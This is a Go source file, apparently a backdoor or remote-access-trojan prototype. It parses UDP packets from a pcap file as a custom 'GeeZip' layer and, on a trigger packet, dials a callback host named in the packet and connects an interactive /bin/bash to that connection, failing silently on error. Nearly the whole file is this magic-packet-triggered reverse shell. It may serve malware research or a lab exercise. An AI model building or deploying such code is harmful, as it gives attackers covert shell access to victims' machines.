package main

import (
	"encoding/hex"
	"log"
	"net"
	"os"
	"os/exec"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var end chan int

func doRat(trigger []byte, host string) {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		return // fail silently
	}
	defer conn.Close()

	conn.Write([]byte("Received trigger packet with key=" + hex.EncodeToString(trigger) + ", spawning a shell...\n"))

	cmd := exec.Command("/bin/bash", "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()

}

func handlePacket(pkt gopacket.Packet) {
	if t := pkt.TransportLayer(); t != nil && t.LayerType() == layers.LayerTypeUDP {
		if p := gopacket.NewPacket(t.LayerPayload(), GeeZipLayerType, gopacket.Lazy); p != nil {
			l := p.Layer(GeeZipLayerType)
			doRat(l.(GeeZipLayer).TriggerFlag, l.(GeeZipLayer).CBString)
		}
	}
}

func main() {
	end = make(chan int, 1)

	if len(os.Args) != 2 {
		log.Fatalf("Usage: %s <filename>\n", os.Args[0])
	}

	handle, err := pcap.OpenOffline(os.Args[1])
	if err != nil {
		panic(err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		handlePacket(packet)
	}

	<-end

	return
}
